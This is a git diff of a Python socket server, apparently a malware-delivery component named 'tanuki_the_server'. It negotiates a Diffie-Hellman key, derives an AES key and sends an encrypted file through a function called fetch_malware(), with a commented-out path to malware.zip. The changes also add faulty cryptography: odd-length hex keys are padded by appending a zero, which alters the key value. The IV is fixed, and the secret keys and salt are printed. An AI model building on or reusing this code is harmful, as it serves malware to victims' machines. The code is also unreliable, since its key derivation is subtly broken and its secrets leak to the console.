@@ -3,10 +3,9 @@ import random
 import socket
 from sympy import *
 import json
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-
+import pbkdf2
+import hashlib
 
 HOST = '127.0.0.1'  # Symbolic name, meaning all available interfaces
 PORT = 65432  # Arbitrary non-privileged port
@@ -52,17 +51,13 @@ def calculate_dh_key(base, secret, mod_prime):
 
 
 def calculate_aes_key(dh_key):
-    size = int((DH_KEY_LENGTH + 7) / 8)
-    return PBKDF2HMAC(
-        algorithm=hashes.SHA256(),
-        length=int(AES_KEY_LENGTH / 8),
-        salt=SALT,
-        iterations=480000
-    ).derive(dh_key.to_bytes(size, byteorder='big', signed=False))
-
+    key = b""
+    return pbkdf2.pbkdf2(hashlib.sha256, key.fromhex(dh_key), SALT, 480000, 32)
+    
 
 def fetch_malware():
     exe_path = ".\\tanuki_the_server\\test_file.txt"
+    #exe_path = ".\\tanuki_the_server\\malware.zip"
     with open(exe_path, 'rb') as f:
         binary_data = f.read()
         return binary_data
@@ -70,6 +65,21 @@ def fetch_malware():
 
 def split_data_for_buffer(data, buffer_size):
     return [data[i:i+buffer_size] for i in range(0, len(data), buffer_size)]
+
+
+def string_to_byte_array(hex_str):
+    try:
+        num_chars = len(hex_str)
+        bytes = bytearray(num_chars // 2)
+        for i in range(0, num_chars, 2):
+            bytes[i // 2] = int(hex_str[i:i + 2], 16)
+            print("Byte written:", bytes[i // 2])
+        
+        return bytes
+    except Exception as ex:
+        print("StringToByteArray error:", ex)
+        return None
+
 
 
 def start_server():
@@ -104,12 +114,15 @@ def start_server():
             elif operation == "keyExchangeAns":
                 print(f"Received params to establish symmetric encryption key")
                 dh_key = calculate_dh_key(int(request["Gx_client"]), dh_secret, dh_prime)
-                aes_key = calculate_aes_key(dh_key)
+                dh_key_hex = hex(dh_key)[2:]
+                if len(dh_key_hex) % 2 != 0:
+                    dh_key_hex = dh_key_hex + "0"
+                print("dh key int: " + str(dh_key))
+                print("dh key hex: " + dh_key_hex)
                 
-                #print(f"Computed DH key: {dh_key}")
+                aes_key = calculate_aes_key(dh_key_hex)
                 print(f"Computed AES key: {aes_key.hex()}")
-            
-
+                
                 cipher = Cipher(algorithms.AES(aes_key), modes.CBC(IV))
                 encryptor = cipher.encryptor()
 
@@ -131,4 +144,5 @@ def start_server():
 
 if __name__ == "__main__":
     print(IV.hex())
+    print(SALT.hex())
     start_server()
